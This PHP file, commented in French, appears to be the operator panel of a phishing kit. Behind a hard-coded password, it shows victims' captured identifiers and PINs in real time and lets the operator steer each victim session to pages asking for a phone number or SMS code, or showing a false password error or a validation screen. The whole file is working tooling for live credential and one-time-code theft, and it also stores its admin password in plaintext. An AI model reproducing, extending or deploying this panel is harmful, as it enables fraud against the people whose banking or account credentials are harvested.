<?php
// admin_panel.php – interface pour valider/refuser

require_once 'db.php';

$adminPassword = 'admin123'; // à changer !

if (isset($_POST['login'])) {
    if ($_POST['password'] === $adminPassword) {
        session_start();
        $_SESSION['admin_logged'] = true;
        header('Location: admin_panel.php');
        exit;
    } else {
        $error = "Mot de passe incorrect";
    }
}

if (isset($_POST['logout'])) {
    session_start();
    session_destroy();
    header('Location: admin_panel.php');
    exit;
}

session_start();
if (!isset($_SESSION['admin_logged'])) {
    // Formulaire de connexion
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Admin - Connexion</title></head>
    <body>
        <h2>Accès administrateur</h2>
        <?php if (isset($error)) echo "<p style='color:red'>$error</p>"; ?>
        <form method="post">
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit" name="login">Se connecter</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// Traitement de la sélection de page à afficher
if (
    $_SERVER['REQUEST_METHOD'] === 'POST'
    && isset($_POST['page_choice'], $_POST['session_id'])
) {
    $sessionId = $_POST['session_id'];
    $pageChoice = $_POST['page_choice'];
    // On enregistre le choix de page dans la colonne status
    $pages = ['numero', 'sms', 'error.pass', 'validation'];
    if (in_array($pageChoice, $pages)) {
        DB::updateStatus($sessionId, $pageChoice);
    }
    header('Location: admin_panel.php');
    exit;
}

$activeRequests = DB::getActiveRequests();
?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin - Validation des codes</title>
    <meta http-equiv="refresh" content="5">
    <style>
        body { font-family: sans-serif; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .approve { background-color: #4CAF50; color: white; border: none; padding: 5px 10px; cursor: pointer; }
        .reject { background-color: #f44336; color: white; border: none; padding: 5px 10px; cursor: pointer; }
        .logout { float: right; }
    </style>
</head>
<body>
    <div>
        <form method="post" style="display:inline;">
            <button type="submit" name="logout" class="logout">Déconnexion</button>
        </form>
        <h2>Requêtes actives</h2>
    </div>
    <?php if (empty($activeRequests)): ?>
        <p>Aucune requête active.</p>
    <?php else: ?>
        <table>
            <tr><th>ID</th><th>Session</th><th>Identifiant</th><th>PIN</th><th>Statut</th><th>Date</th><th>Actions</th></tr>
            <?php foreach ($activeRequests as $req): ?>
            <tr>
                <td><?= htmlspecialchars($req['id']) ?></td>
                <td><?= htmlspecialchars($req['session_id']) ?></td>
                <td><?= htmlspecialchars($req['identifiant'] ?? '(aucun)') ?></td>
                <td><?= htmlspecialchars($req['pin'] ?? '(aucun code)') ?></td>
                <td><?= htmlspecialchars($req['status']) ?></td>
                <td><?= htmlspecialchars($req['created_at']) ?></td>
                <td>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="session_id" value="<?= htmlspecialchars($req['session_id']) ?>">
                        <select name="page_choice" required>
                            <option value="">Sélectionner une page…</option>
                            <option value="numero">Numéro</option>
                            <option value="sms">SMS</option>
                            <option value="error.pass">Erreur mot de passe</option>
                            <option value="validation">Validation</option>
                        </select>
                        <button type="submit" class="approve">Envoyer</button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
    <?php endif; ?>
</body>
</html>